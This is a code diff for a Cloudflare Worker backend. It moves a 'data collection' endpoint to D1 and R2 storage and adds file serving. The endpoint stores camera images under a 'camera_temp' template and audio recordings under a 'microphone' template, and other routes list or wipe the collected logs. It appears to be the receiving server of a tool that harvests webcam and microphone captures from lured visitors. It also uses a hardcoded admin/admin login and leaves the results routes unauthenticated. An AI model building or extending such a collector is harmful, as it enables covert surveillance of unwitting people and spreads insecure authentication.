@@ -33,19 +33,13 @@ const MeetingSchema = z.object({
     title: z.string().optional(),
 });
 
-import { RealtimeKitAPI } from '@cloudflare/realtimekit';
-
-const app = new Hono();
-
 // --- Authentication ---
 const USERS = {
   admin: 'admin',
 };
 
 app.post('/api/login', openapi.json(LoginSchema), async (c) => {
-  const { username, password } = c.req.valid('json')
-app.post('/api/login', async (c) => {
-  const { username, password } = await c.req.json();
+  const { username, password } = c.req.valid('json');
   if (USERS[username] === password) {
     return c.json({ success: true, token: 'dummy-token' });
   }
@@ -54,24 +48,78 @@ app.post('/api/login', async (c) => {
 
 // --- General Data Collection ---
 app.get('/api/results', async (c) => {
-  const results = await c.env.KV.get('results');
-  return c.text(results || '');
+    try {
+        const { results } = await c.env.DB.prepare('SELECT * FROM logs ORDER BY timestamp DESC').all();
+        return c.json(results);
+    } catch (e) {
+        console.error(e);
+        return c.json({ success: false, error: 'Failed to read from database.' }, 500);
+    }
 });
 
 app.post('/api/clear', async (c) => {
-  await c.env.KV.put('results', '');
-  return c.json({ success: true });
+    try {
+        await c.env.DB.prepare('DELETE FROM logs').run();
+        return c.json({ success: true });
+    } catch (e) {
+        console.error(e);
+        return c.json({ success: false, error: 'Failed to clear database.' }, 500);
+    }
 });
+
 app.post('/api/collect', openapi.json(CollectSchema), async (c) => {
-  const { template, data } = c.req.valid('json');
-app.post('/api/collect', async (c) => {
-  const { template, data } = await c.req.json();
-  
-  const key = `results`;
-  const existingData = await c.env.KV.get(key);
-  const newData = `${existingData || ''}\n[${template}] ${JSON.stringify(data)}`;
-  await c.env.KV.put(key, newData);
-  return c.text('Data collected');
+    const { template, data } = c.req.valid('json');
+
+    try {
+        let fileUrl = null;
+        let logData = data;
+
+        // Handle file uploads for specific templates
+        if (template === 'camera_temp' && data.image) {
+            const key = `image-${Date.now()}.png`;
+            const body = Buffer.from(data.image, 'base64');
+            await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'image/png' } });
+            fileUrl = `/r2/${key}`;
+            logData = { ...data, imageUrl: fileUrl, image: undefined }; // Remove large data from log
+        } else if (template === 'microphone' && data.audio) {
+            const key = `audio-${Date.now()}.wav`;
+            // The audio data is a data URL: "data:audio/wav;base64,..."
+            const audioBase64 = data.audio.split(',')[1];
+            const body = Buffer.from(audioBase64, 'base64');
+            await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'audio/wav' } });
+            fileUrl = `/r2/${key}`;
+            logData = { ...data, audioUrl: fileUrl, audio: undefined }; // Remove large data from log
+        }
+
+        // Log metadata to D1
+        const stmt = c.env.DB.prepare(
+            'INSERT INTO logs (template, data) VALUES (?, ?)'
+        ).bind(template, JSON.stringify(logData));
+        await stmt.run();
+
+        return c.text('Data collected successfully.');
+    } catch (e) {
+        console.error(e);
+        return c.json({ success: false, error: 'Failed to write to database/bucket. Make sure you have run migrations and configured bindings.' }, 500);
+    }
+});
+
+// --- R2 File Serving ---
+app.get('/r2/:key', async (c) => {
+    const key = c.req.param('key');
+    const object = await c.env.BUCKET.get(key);
+
+    if (object === null) {
+        return c.notFound();
+    }
+
+    const headers = new Headers();
+    object.writeHttpMetadata(headers);
+    headers.set('etag', object.httpEtag);
+
+    return new Response(object.body, {
+        headers,
+    });
 });
 
 // --- Template Listing ---
@@ -91,9 +139,6 @@ const ACTIVE_MEETING_KEY = 'active_meeting_id';
 
 app.post('/api/meetings', openapi.json(MeetingSchema), async (c) => {
   const { title } = c.req.valid('json');
-app.post('/api/meetings', async (c) => {
-  const { title } = await c.req.json();
-
 
   const realtime = new RealtimeKitAPI(c.env.REALTIMEKIT_API_KEY, {
     realtimeKitOrgId: c.env.REALTIMEKIT_ORG_ID,
@@ -133,6 +178,12 @@ app.post('/api/meetings', async (c) => {
 app.post('/api/meetings/end', async (c) => {
   await c.env.KV.delete(ACTIVE_MEETING_KEY);
   return c.json({ success: true, message: 'Active meeting ended.' });
+});
+
+// --- Static Asset Serving ---
+// This should be the last route
+app.get('*', (c) => {
+  return c.env.ASSETS.fetch(c.req.raw);
 });
 
 export default app;
